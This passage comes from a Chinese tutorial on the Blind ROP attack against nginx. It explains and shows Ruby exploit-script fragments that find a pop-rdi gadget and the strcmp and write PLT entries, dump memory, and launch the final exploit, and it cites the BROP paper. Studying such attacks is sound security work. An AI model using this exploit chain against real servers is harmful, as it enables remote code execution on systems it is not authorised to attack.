addr = @plt + 0x200
addr = @plt + 0x1000 # if @large_text
while true
addr += 7
rop = []
rop &lt;&lt; addr
6.times do
rop &lt;&lt; @plt
end
if check_instr(addr, rop)#找到6个pop ret
break if verify_gadget(addr) #测试rdi和rsi偏移
end
end
end
```

[![](https://p2.ssl.qhimg.com/t0175dd0c6549fb794b.png)](https://p2.ssl.qhimg.com/t0175dd0c6549fb794b.png)

通过找到pop rdi，可以在对应nginx中得到印证。通过IDA和Nginx对应地址的对比，5F C3正是pop rdi,ret。



```
40706A  5F C3;  IDA pro
gdb-peda$ disas 0x40706a
   0x0000000000407069 &lt;+2855&gt;:pop    r15
   0x000000000040706b &lt;+2857&gt;:ret    
End of assembler dump.
```

这一步完成后，我们就需要进行strcmp和write对应plt项的查找了，为什么要找strcmp呢，因为strcmp的汇编功能是对rdx赋予一个长度值，通过这种方法可以对rdx，也就是第三个参数赋值，因为在.text字段中很难找到pop rdx,ret这样的gadget。

找这两个plt项，需要利用这两个plt项的特性，比如strcmp就是对比两个字符串内容。如果两个字符串相等，没有崩溃，且不相等，crash的话，这就是一个strcmp。



```
def find_strcmp()
entry = 0
        good = @rip
while true
rc = try_strcmp(entry, good) #对比两个字符串值
if rc != false
print("Found strcmp #`{`rc`}`n")
@strcmp = rc
@strcmp_addr = good
break
end
entry += 1
end
End

def do_try_strcmp(entry, good)
bad1 = 300
bad2 = 500
        return false if call_plt(entry, bad1, bad2) != false
        return false if call_plt(entry, good, bad2) != false
        return false if call_plt(entry, bad1, good) != false
        return false if call_plt(entry, good, good) != true
        return false if call_plt(entry, VSYSCALL + 0x1000 - 1, good) != true
        return true
end
```

[![](https://p3.ssl.qhimg.com/t017e7ac551ad670ebe.png)](https://p3.ssl.qhimg.com/t017e7ac551ad670ebe.png)

而write函数的plt项，就是利用多次写入socket，如果能打开多个文件描述符的话，就是write了。



```
def find_write()
entry = 0
find_plt_start() if @small and not @plt_start
get_banner_len()
while entry &lt; 300
if try_write(entry)#尝试文件描述符写入
print("nFound write at #`{`@write`}` (wlen #`{`@strcmp_len`}`)n")
break
end
entry += 1
End
```

这样，就能够获取到write plt，rdi，rsi和rdx所有的组件了，这样就可以dump内存，通过dump内存，可以组成更多的gadgets，最后执行shellcode完成攻击。



```
do_step(method(:find_rdx)) if not have_small_write() #用strcmp构成第三个参数
do_step(method(:dump_bin)) if not can_exploit() #dump 内存，获取更多的gadgets
do_step(method(:exploit)) #攻击！
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01754a00dff9dfb835.png)

[![](https://p4.ssl.qhimg.com/t017f8df4142463718c.png)](https://p4.ssl.qhimg.com/t017f8df4142463718c.png)

Blind ROP是一个非常有意思的攻击，虽然难度不大，但是很复杂，也很开脑洞，着实学到了很多东西，在这里，非常感谢explorer，0xmuhe，joker，swing各位师傅一起交流学习，同时也感谢安全客，如有不当之处，还请大家多多交流，这应该是节前最后一篇文章了，春节快到了，在这里祝大家给大家拜个早年！新年快乐，谢谢！

<br>

**参考文章**

[http://www.scs.stanford.edu/brop/](http://www.scs.stanford.edu/brop/)

[http://blog.csdn.net/omnispace/article/details/51006149](http://blog.csdn.net/omnispace/article/details/51006149)

[https://github.com/zh-explorer/hctf2016-brop](https://github.com/zh-explorer/hctf2016-brop)

[http://ytliu.info/blog/2014/06/01/blind-return-oriented-programming-brop-attack-er/](http://ytliu.info/blog/2014/06/01/blind-return-oriented-programming-brop-attack-er/)
